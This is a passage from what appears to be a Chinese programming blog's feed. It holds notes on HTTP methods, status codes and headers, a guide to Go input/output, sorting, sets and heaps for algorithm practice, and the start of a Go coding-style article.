style="text-align: center;">向服务器发送该方法，会返回对指定资源所支持的HTTP 请求方法。</td></tr><tr class="even"><td style="text-align: center;">PATCH</td><td style="text-align: center;">对 PUT方法的补充，用来对已知资源进行局部更新。</td></tr><tr class="odd"><td style="text-align: center;">TRACE</td><td style="text-align: center;">回显服务器收到的请求数据，即服务器返回自己收到的数据，主要用于测试和诊断。</td></tr></tbody></table><p>GET和POST大概是我们最常见到的请求方法了。下面对其区别进行深入探讨。</p><h4 id="参数位置">参数位置</h4><p>我们对其最直观的感受，GET经常用来请求页面，参数放到<code>url</code>的<code>path</code>里，而POST经常用来提交表单，参数放到<code>body</code>里。实际上这只是习惯的用法，从协议本身看，并没有什么限制说GET一定不能没有<code>body</code>，POST就一定不能把参放到<code>&lt;URL&gt;</code>的<code>querystring</code>上。因此其实可以更加自由的去利用格式。比如<code>Elastic Search</code>的<code>_search api</code>就用了带<code>body</code>的GET；也可以自己开发接口让POST一半的参数放在<code>url</code>的<code>querystring</code>里，另外一半放<code>body</code>里；你甚至还可以让所有的参数都放Header里——可以做各种各样的定制，只要请求的客户端和服务器端能够约定好。如果用过Postman的话，也能感受到其实不管是什么方法都能自由的把数据填到任何位置(所以也会经常填错(笑))</p><p>另外，我们也知道url是有长度限制的。其实url本身并没有对长度进行限制，但是浏览器会对 url 进行限制，比如 FireFox 限制url 的最大长度为 65536 个字符，也就是 64KB的大小，而 Chrome 限制 url最大长度为 8182个字符，也就是 8 KB的大小。因此，url只要某个要开发的资源/api的URL长度特别长，就推荐使用body来传输数据，除非有特殊情况。因为过长的url即使忽略浏览器本身的限制，也不利于后续的项目维护，不利于搜索引擎的爬取等。</p><h4 id="安全性">安全性</h4><p>我们常听到GET不如POST安全，因为POST用body传输数据，而GET用url传输，更加容易看到。但是从攻击的角度，无论是GET还是POST都不够安全，因为HTTP本身是<strong>明文协议</strong>。<strong>每个HTTP请求和返回的每个byte都会在网络上明文传播，不管是url，header还是body</strong>。这完全不是一个“是否容易在浏览器地址栏上看到“的问题。</p><p>为了避免传输中数据被窃取，必须做从客户端到服务器的端端加密。业界的通行做法就是<strong>https</strong>——即用SSL协议协商出的密钥加密明文的http数据。这个加密的协议和HTTP协议本身相互独立。如果是利用HTTP开发公网的站点/App，要保证安全，https是最最基本的要求。</p><p>回到HTTP本身，的确GET请求的参数更倾向于放在<code>url</code>上，因此有更多机会被泄漏。比如携带私密信息的url会展示在地址栏上，还可以分享给第三方，就非常不安全了。此外，从客户端到服务器端，有大量的中间节点，包括网关，代理等。他们的accesslog通常会输出完整的<code>url</code>，比如nginx的默认accesslog就是如此。如果url上携带敏感数据，就会被记录下来。但请注意<strong>，就算私密数据在body里，也是可以被记录下来的</strong>。</p><p>当然，对于重要的数据，也可以在POST的body中再次对数据加密，对于GET的请求参数也可以采用一些方式进行处理，比如短<code>url</code>生成等，使链接便于传播(当然这解决不了安全问题)。但是最本质的安全策略还是HTTPS。另外，网络安全也是个非常深的话题，在这里单独拎出来讨论GET和POST的安全性问题，其实意义不是很大。</p><h3 id="http状态码">HTTP状态码</h3><table><thead><tr class="header"><th style="text-align: center;">状态码</th><th style="text-align: center;">类别</th><th style="text-align: center;">含义</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(100 \sim199\)</span></td><td style="text-align: center;">信息性状态码</td><td style="text-align: center;">接收的请求正在处理</td></tr><tr class="even"><td style="text-align: center;"><span class="math inline">\(200 \sim299\)</span></td><td style="text-align: center;">成功状态码</td><td style="text-align: center;">请求正常处理完毕</td></tr><tr class="odd"><td style="text-align: center;"><span class="math inline">\(300 \sim399\)</span></td><td style="text-align: center;">重定向状态码</td><td style="text-align: center;">使用替代位置来访问</td></tr><tr class="even"><td style="text-align: center;"><span class="math inline">\(400 \sim499\)</span></td><td style="text-align: center;">客户端错误状态码</td><td style="text-align: center;">服务器无法处理请求</td></tr></tbody></table><p>比较常见的状态码：</p><p>200：成功返回响应</p><p>301：永久重定向，客户端第一次访问此 url时，告知客户端以后直接访问新的 url，该状态保存在浏览器缓存中。</p><p>302；临时重定向，客户端每次访问此 url 时，告知客户端重定向到新的 url，后续访问依然访问当前的 url。</p><p>400：发送的请求错误，请求格式错误，或者没有服务器要求的数据。</p><p>401：没有权限访问，当前用户没有权限访问此资源。</p><p>403: 请求被服务器禁止。</p><p>404：请求的 url 不存在，一般是 url 出错。</p><p>500： 服务器处理请求出现错误。</p><p>501：服务器超出能力之外的方法，例如：请求的方法服务器不支持。</p><p>504：来自网关或者代理服务器，请求资源服务器时超时。</p><h3 id="http首部">HTTP首部</h3><p>http 主要有 4种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p><p>除此之外，还有一种扩展首部，这种首部还未添加的 http标准中去。在一些大型互联网公司内部，开发者需要特定的扩展首部来实现特殊的功能。</p><div class="code-wrapper"><pre><code class="hljs">通用首部字段：请求和响应都可以使用的首部，与报文相关的最基本的信息。请求首部字段：仅在请求中使用的首部。响应首部字段：仅在响应中使用的首部。实体首部字段：用于应对实体部分的首部，一般是对实体内容进行说明。</code></pre></div><p>在后面更加具体的讲HTTP发展过程中新增的特性时，会对这些首部进行详细的讲解。</p><h3 id="总结">总结</h3><p>在这一部分，对请求和响应的最基本的内容进行介绍，特别是关于请求方法和状态码中的一些细节在面试和实际工作中有必要进行熟悉。事实上这一部分也只是做一个铺垫，对HTTP协议的基础知识做一个简单的回顾。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 刷题快速入门</title>
    <link href="/posts/41936/"/>
    <url>/posts/41936/</url>
    
    <content type="html"><![CDATA[<h1 id="go-刷题快速入门">Go 刷题快速入门</h1><p>这篇文章讲述使用Golang刷题时遇到的关于输入输出和数据结构的常见问题，并在必要时进行相关知识点的讲解，方便刚入门Go进行刷题实践时进行查阅和学习理解。</p><h2 id="输入输出">输入输出</h2><p>如果是在力扣这类核心代码模式的平台，就和写其他语言一样，不需要去关心输入输出的模式。但当下大部分公司的笔试算法题都是采用的ACM模式。因此若希望在笔试中展现自己的Golang编程能力，还是需要熟悉常见的输入输出格式。</p><h3 id="读整数">读整数</h3><p>这里我们以<code>a+b</code>为例说明。</p><h4 id="每行数字固定">每行数字固定</h4><blockquote><p>输入描述: 输入包括两个正整数 a,b(1 &lt;= a, b &lt;=1000),输入数据包括多组。</p><p>输出描述: 输出a+b的结果</p><p>输入例子1: 1 5 10 20</p><p>输出例子1: 6 30</p></blockquote><p>最简单的情况。<code>fmt.Scan</code>返回成功读取的item数以及<code>err</code>。这里由于仅仅是算法示例题目，为了方便忽略了错误处理。当然用<code>fmt.Scanln</code>也是可以的。</p><p>Scan从标准输入扫描文本，读取由空白符分隔的值保存到传递给本函数的参数中，换行符视为空白符。本函数返回成功扫描的数据个数和遇到的任何错误。如果读取的数据个数比提供的参数少，会返回一个错误报告原因。</p><p>而Scanln遇到换行才停止扫描。最后一个数据后面必须有换行或者到达结束位置。返回值和Scan含义一样。</p><p>下面给出示例代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ffu3ailmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-ffu3ailmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"fmt"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    a := <span class="hljs-number">0</span>    b := <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> {        n, _ := fmt.Scan(&amp;a, &amp;b)        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> {            <span class="hljs-keyword">break</span>        } <span class="hljs-keyword">else</span> {            fmt.Printf(<span class="hljs-string">"%d\n"</span>, a + b)        }    }}</code></pre></div></div><h4 id="每行数字不固定但知道数量">每行数字不固定，但知道数量</h4><blockquote><p>输入描述: 输入数据有多组, 每行表示一组输入数据。每行的第一个整数为整数的个数n(1 &lt;= n &lt;= 100)。 接下来n个正整数,即需要求和的每个正整数。</p><p>输出描述: 每组数据输出求和的结果</p><p>输入例子1: 4 1 2 3 4 5 1 2 3 4 5</p><p>输出例子1: 10 15</p></blockquote><p>同样的道理，不赘述。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j6hnr2lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-j6hnr2lmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span>(    <span class="hljs-string">"fmt"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    <span class="hljs-keyword">var</span> t,crr,sum <span class="hljs-type">int</span>    <span class="hljs-keyword">for</span> {        n,_ := fmt.Scan(&amp;t)        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>{            <span class="hljs-keyword">break</span>        }<span class="hljs-keyword">else</span>{            sum = <span class="hljs-number">0</span>            <span class="hljs-keyword">for</span> i:=<span class="hljs-number">0</span>;i&lt;t;i++{                fmt.Scan(&amp;crr)                sum += crr            }            fmt.Println(sum)        }    }    }</code></pre></div></div><h4 id="每行数字不固定也不知道数量">每行数字不固定，也不知道数量</h4><p>这个时候我们需要一整行一整行地读，这时需要用到bufio包，还是需要格外记忆一下。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-96w9lxlmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-96w9lxlmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"bufio"</span>    <span class="hljs-string">"fmt"</span>    <span class="hljs-string">"os"</span>    <span class="hljs-string">"strconv"</span>    <span class="hljs-string">"strings"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    inputs := bufio.NewScanner(os.Stdin)    <span class="hljs-keyword">for</span> inputs.Scan() {  <span class="hljs-comment">//每次读入一行</span>        data := strings.Split(inputs.Text(), <span class="hljs-string">" "</span>)  <span class="hljs-comment">//通过空格将他们分割，并存入一个字符串切片</span>        <span class="hljs-keyword">var</span> sum <span class="hljs-type">int</span>        <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> data {            num, _ := strconv.Atoi(data[i])   <span class="hljs-comment">//将字符串转换为int</span>            sum += num        }        fmt.Println(sum)    }}</code></pre></div></div><p>补充一个C++的实现，用到了<code>stringstream</code>。</p><p>另外需要提醒的是，<code>stringstream</code>构造函数会特别消耗内存，似乎不打算主动释放内存(或许是为了提高效率)，但如果你要在程序中用同一个流，反复读写大量的数据，将会造成大量的内存消耗，因些这时候，需要适时地清除一下缓冲(用 stream.str("") ，需要注意clear()仅仅清空标志位，并没有释放内存)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mddjwqlmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-mddjwqlmrh9u64"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    std::string line;    <span class="hljs-keyword">while</span> (std::<span class="hljs-built_in">getline</span>(std::cin, line)) {        <span class="hljs-function">std::istringstream <span class="hljs-title">iss</span><span class="hljs-params">(line)</span></span>;        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;        <span class="hljs-type">int</span> num;        <span class="hljs-keyword">while</span> (iss &gt;&gt; num) {            sum += num;        }        std::cout &lt;&lt; sum &lt;&lt; std::endl;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h3 id="读字符串">读字符串</h3><blockquote><p>输入描述: 多个测试用例，每个测试用例一行。</p><p>每行通过空格隔开，有n个字符，n＜100</p><p>输出描述:对于每组测试用例，输出一行排序过的字符串，每个字符串通过空格隔开</p><p>输入例子1: a c bb f dddd nowcoder</p><p>输出例子1: a bb c dddd f nowcoder</p></blockquote><p>排序是我们算法设计中频繁使用的操作，因此在这里也捎带进行讲解和记录。</p><p>Go语言的 sort.Sort函数不会对具体的序列和它的元素做任何假设。相反，它使用了一个接口类型sort.Interface来指定通用的排序算法和可能被排序到的序列类型之间的约定。这个接口的实现由序列的具体表示和它希望排序的元素决定，序列的表示经常是一个切片。</p><p>根据直觉，排序算法需要知道三个东西：序列的长度，表示两个元素比较的结果，一种交换两个元素的方式。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0f37tulmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-0f37tulmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> sort<span class="hljs-keyword">type</span> Interface <span class="hljs-keyword">interface</span> {    Len() <span class="hljs-type">int</span>            <span class="hljs-comment">// 获取元素数量</span>    Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> <span class="hljs-comment">// i，j是序列元素的指数。</span>    Swap(i, j <span class="hljs-type">int</span>)        <span class="hljs-comment">// 交换元素</span>}</code></pre></div></div><p>为了对序列进行排序，我们需要定义一个实现了这三个方法的类型，然后对这个类型的一个实例应用sort.Sort 函数。</p><p>我们可以像任何其他语言一样灵活的自定义排序规则。但大部分情况中，只需要对字符串、整型等进行快速排序。根据优化热点行为的原则，Golang对Go语言中提供了一些固定模式的封装以方便开发者迅速对内容进行排序。因此在这个题目中我们可以简单的调用<code>sort.Strings</code>按字典序进行排序。同时，像C++一样，我们可以自定义排序函数，使其倒序排列：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qmurt6lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-qmurt6lmrh9u64"><pre><code class="hljs go">sort.Slice(a,<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i,j <span class="hljs-type">int</span>)</span></span><span class="hljs-type">bool</span>{<span class="hljs-keyword">return</span> a[i]&gt;a[j] })</code></pre></div></div><p><code>strings.Join</code>将切片连接成字符串。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jylzgblmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-jylzgblmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"fmt"</span>    <span class="hljs-string">"bufio"</span>    <span class="hljs-string">"os"</span>    <span class="hljs-string">"strings"</span>    <span class="hljs-string">"sort"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    input := bufio.NewScanner(os.Stdin)    <span class="hljs-keyword">for</span> input.Scan(){        data := strings.Split(input.Text(),<span class="hljs-string">" "</span>)        sort.Strings(data)        fmt.Println(strings.Join(data, <span class="hljs-string">" "</span>))}}</code></pre></div></div><h2 id="数据结构">数据结构</h2><h3 id="线性容器">线性容器</h3><p>Golang内置的切片以及其方便的操作，可以满足我们使用向量，栈和队列等需求。比如以经典的考察栈的运用的<a href="https://leetcode.cn/problems/valid-parentheses/">有效的括号</a>为例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c5egfxlmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-c5egfxlmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isValid</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {    n := <span class="hljs-built_in">len</span>(s)    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> {        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>    }    pairs := <span class="hljs-keyword">map</span>[<span class="hljs-type">byte</span>]<span class="hljs-type">byte</span>{        <span class="hljs-string">')'</span>: <span class="hljs-string">'('</span>,        <span class="hljs-string">']'</span>: <span class="hljs-string">'['</span>,        <span class="hljs-string">'}'</span>: <span class="hljs-string">'{'</span>,    }    stack := []<span class="hljs-type">byte</span>{}    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; n; i++ {        <span class="hljs-keyword">if</span> pairs[s[i]] &gt; <span class="hljs-number">0</span> {            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(stack) == <span class="hljs-number">0</span> || stack[<span class="hljs-built_in">len</span>(stack)<span class="hljs-number">-1</span>] != pairs[s[i]] {                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>            }            stack = stack[:<span class="hljs-built_in">len</span>(stack)<span class="hljs-number">-1</span>]        } <span class="hljs-keyword">else</span> {            stack = <span class="hljs-built_in">append</span>(stack, s[i])        }    }    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(stack) == <span class="hljs-number">0</span>}</code></pre></div></div><h3 id="映射">映射</h3><p>Golang中的<code>map</code>对应于C++中的<code>unordered_map</code>。下面主要讲述怎么使用<code>map</code>实现<code>set</code>和可排序的<code>map</code>。</p><p><code>map</code>的 key 肯定是唯一的，而这恰好与 set的特性一致，天然保证 set 中成员的唯一性。而且通过 map 实现set，在检查是否存在某个元素时可直接使用<code>_, ok := m[key]</code>的语法，效率高。</p><p>先来看一个简单的实现，如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fcubnblmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-fcubnblmrh9u64"><pre><code class="hljs go">set := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>) <span class="hljs-comment">// New empty set</span>set[<span class="hljs-string">"Foo"</span>] = <span class="hljs-literal">true</span>            <span class="hljs-comment">// Add</span><span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> set {         <span class="hljs-comment">// Loop</span>    fmt.Println(k)}<span class="hljs-built_in">delete</span>(set, <span class="hljs-string">"Foo"</span>)    <span class="hljs-comment">// Delete</span>size := <span class="hljs-built_in">len</span>(set)      <span class="hljs-comment">// Size</span>exists := set[<span class="hljs-string">"Foo"</span>]  <span class="hljs-comment">// Membership</span></code></pre></div></div><p>通过创建<code>map[string]bool</code>来存储<code>string</code>的集合，比较容易理解。而且判断元素是否存在可以很简单的写成<code>if set["foo"]</code>，一般做算法题的时候已经足够了，简单快捷。</p><p>但这里还有个问题，<code>map</code> 的 <code>value</code>是布尔类型，这会导致 set 多占一定内存空间，而 <code>set</code>不该有这个问题。如果我们对占用空间有要求，可以考虑利用空结构体。</p><p>在 Go 中，空结构体不占任何内存。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2s8qrclmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-2s8qrclmrh9u64"><pre><code class="hljs go">unsafe.Sizeof(<span class="hljs-keyword">struct</span>{}{}) <span class="hljs-comment">// 结果为 0</span></code></pre></div></div><p>因此可以实现如下例所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ubzxjblmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-ubzxjblmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {set := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>{}{<span class="hljs-string">"pm"</span>: {},<span class="hljs-string">"fe"</span>: {},<span class="hljs-string">"rd"</span>: {},}<span class="hljs-keyword">if</span> v, ok := set[<span class="hljs-string">"rd"</span>]; ok {fmt.Println(<span class="hljs-string">"exist"</span>)fmt.Println(<span class="hljs-string">"size:"</span>, unsafe.Sizeof(v))} <span class="hljs-keyword">else</span> {fmt.Println(<span class="hljs-string">"not exist"</span>)}}</code></pre></div></div><h3 id="堆">堆</h3><p>Go的标准包<code>Container</code>中包含了常用的容器类型,包括<code>conatiner/List</code>,<code>container/heap</code>,<code>container/ring</code>。关于双向链表和环形链表，虽然在实际工作中也会经常用到，但在力扣中通常会给出链表的结构体，其他链表的操作和功能需要我们自己去实现；而ACM题目为了方便程序调试常常使用向量模拟链表，鉴于篇幅有限不在此详细讲解，也可以参阅<a href="https://juejin.cn/post/7042729165400834056">这篇文章</a>进行更深入的了解。在此主要总结一下堆的实现和使用。</p><p>首先若是ACM模式，需要导包：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dkhn61lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-dkhn61lmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">"container/heap"</span><span class="hljs-string">"fmt"</span>)</code></pre></div></div><p>我们要使用go标准库给我们提供的heap，那么必须自己实现这些接口定义的方法，需要实现的方法如下：</p><ul><li>Len() int</li><li>Less(i, j int) bool</li><li>Swap(i, j int)</li><li>Push(x interface{})</li><li>Pop() interface{}</li></ul><p>实现了这五个方法的数据类型才能使用go标准库给我们提供的heap，下面简单示例为定义一个IntHeap类型，并实现上面五个方法。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k92qxxlmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-k92qxxlmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">type</span> IntHeap []<span class="hljs-type">int</span>  <span class="hljs-comment">// 定义一个类型</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Len() <span class="hljs-type">int</span> { <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(h) }  <span class="hljs-comment">// 绑定len方法,返回长度</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> {  <span class="hljs-comment">// 绑定less方法</span><span class="hljs-keyword">return</span> h[i] &lt; h[j]  <span class="hljs-comment">// 如果h[i]&lt;h[j]生成的就是小根堆，如果h[i]&gt;h[j]生成的就是大根堆</span>}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Swap(i, j <span class="hljs-type">int</span>) {  <span class="hljs-comment">// 绑定swap方法，交换两个元素位置</span>h[i], h[j] = h[j], h[i]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IntHeap)</span></span> Pop() <span class="hljs-keyword">interface</span>{} {  <span class="hljs-comment">// 绑定pop方法，从最后拿出一个元素并返回</span>old := *hn := <span class="hljs-built_in">len</span>(old)x := old[n<span class="hljs-number">-1</span>]*h = old[<span class="hljs-number">0</span> : n<span class="hljs-number">-1</span>]<span class="hljs-keyword">return</span> x}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IntHeap)</span></span> Push(x <span class="hljs-keyword">interface</span>{}) {  <span class="hljs-comment">// 绑定push方法，插入新元素</span>*h = <span class="hljs-built_in">append</span>(*h, x.(<span class="hljs-type">int</span>))}</code></pre></div></div><p>我们可以借此通过<a href="https://leetcode.cn/problems/top-k-frequent-elements/description">前k个高频元素</a>进行练习。当然这道题目更好的方法是采用快速划分的思想。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-udwltolmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-udwltolmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">topKFrequent</span><span class="hljs-params">(nums []<span class="hljs-type">int</span>, k <span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {    occ:=<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>{}    <span class="hljs-keyword">for</span> _,num:=<span class="hljs-keyword">range</span> nums{        occ[num]++    }    h:=&amp;IHeap{}    heap.Init(h)    <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> occ{        heap.Push(h, [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>{key, value})        <span class="hljs-keyword">if</span> h.Len() &gt; k {            heap.Pop(h)        }    }    ret := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, k)    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; k; i++ {        ret[k - i - <span class="hljs-number">1</span>] = heap.Pop(h).([<span class="hljs-number">2</span>]<span class="hljs-type">int</span>)[<span class="hljs-number">0</span>]    }    <span class="hljs-keyword">return</span> ret}<span class="hljs-keyword">type</span> IHeap[][<span class="hljs-number">2</span>]<span class="hljs-type">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Len() <span class="hljs-type">int</span>{    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(h)}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Less(i,j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span>{    <span class="hljs-keyword">return</span> h[i][<span class="hljs-number">1</span>]&lt;h[j][<span class="hljs-number">1</span>]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Swap(i, j <span class="hljs-type">int</span>){     h[i], h[j] = h[j], h[i] }<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IHeap)</span></span> Push(x <span class="hljs-keyword">interface</span>{}) {    *h = <span class="hljs-built_in">append</span>(*h, x.([<span class="hljs-number">2</span>]<span class="hljs-type">int</span>))}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IHeap)</span></span> Pop() <span class="hljs-keyword">interface</span>{} {    old := *h    n := <span class="hljs-built_in">len</span>(old)    x := old[n<span class="hljs-number">-1</span>]    *h = old[<span class="hljs-number">0</span> : n<span class="hljs-number">-1</span>]    <span class="hljs-keyword">return</span> x}</code></pre></div></div><h3 id="总结">总结</h3><p>这篇文章仅仅是非常浅的总结了Go在算法题目中常用的接口和数据结构，很多地方总结的还不到位，更多知识点还是需要多刷题多实践。当然，从最常用的数据结构和接口中也能体会出很多Go语言的设计思想。尽管有喜闻乐见的手写<code>max</code>函数，但作为一门结合了Python的简洁与C++的严谨和性能的语言，还是很值得我们去学习的，也希望能够渐入佳境，成为训练有素的Gopher。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 高质量编程实践</title>
    <link href="/posts/2118/"/>
    <url>/posts/2118/</url>
    
    <content type="html"><![CDATA[<h1 id="go编码规范">Go编码规范</h1><p>最近正在阅读<code>Effective C++</code>和<code>Effective Modern C++</code>，其中的很多条款都值得反复阅读并牢记，理解其中的原理对用好C++这把瑞士军刀受益匪浅。相应的，最近也发现了<a href="https://go.dev/doc/effective_go"><code>Effective go</code></a>，就如何编写清晰、地道的Go 代码提供了一些技巧。它是对 <a href="https://go-zh.org/ref/spec">语言规范</a>、 <a href="https://tour.golang.org/">Go 语言之旅</a> 以及 <a href="https://go-zh.org/doc/code.html">如何使用 Go 编程</a>的补充说明。得益于Go的简洁，其编程规范比C++要简洁清晰很多。结合Go的官方指导以及实践，对高质量编程的一些方面进行了总结。</p><h2 id="高质量编程简介">高质量编程简介</h2><p>实现同样的功能，可能大到编程范式，小到实现细节，有很多种编码的风格和方式供我们选择。编写的代码能够达到正确可靠、简洁清晰的目标需要我们不断的在实践中修炼。不管是面试还是在实际的项目开发中，都需要我们对高质量的代码有所追求。</p><p>在课件中提到的三个主要的判断维度：</p><ul><li>各种边界条件是否考虑完备</li><li>异常情况处理，稳定性保证</li><li>易读易维护</li></ul><p>编程原则：</p><ul><li>简单性</li><li>可读性</li><li>团队生产力</li></ul><p>前面两点原则容易理解，关于最后一点，因为我们编程其实更重要的是一个团队合作的一个过程，团队的整体工作效率也是非常重要的。比如字节内部采用Go语言，其实最有特点的一点就是，Go语言的简洁性对于降低新成员上手项目代码成本很有帮助。</p><p>在实际的工程项目当中，如果有一些复杂的一些程序逻辑，其他人基本上就不太敢动，尤其是有一些历史的一些逻辑的话，写得比较复杂，可能又难以理解，新接手的人就没办法明确的知道我们这些调整会造成的影响的一些范围，可能会产生什么样的问题。这样的话就会让代码变得难以维护。这些难以维护的这些逻辑在排查问题的时候也会带来不少麻烦。而如果我们的代码比较清晰的话，那么就算出现了一些问题，我们也能通过现象，或者代码逻辑，快速分析排查定位到这些问题。能够提升整体的整个项目开发环节的效率。所以说在写代码时考虑对于团队生产力带来的影响，也是高质量编程原则给我们带来的好的习惯。</p><h2 id="编码规范">编码规范</h2><p>如何编写高质量 Go 代码</p><h3 id="代码格式">代码格式</h3><p>格式化问题总是充满了争议，但却始终没有形成统一的定论。虽说人们可以适应不同的编码风格，但抛弃这种适应过程岂不更好？<strong>若所有人都遵循相同的编码风格，在这类问题上浪费的时间将会更少</strong>。问题就在于如何实现这种设想，而无需冗长的语言风格规范。</p><p>在 Go中我们另辟蹊径，<strong>让机器来处理大部分的格式化问题</strong>。<code>gofmt</code>程序（也可用 <code>go 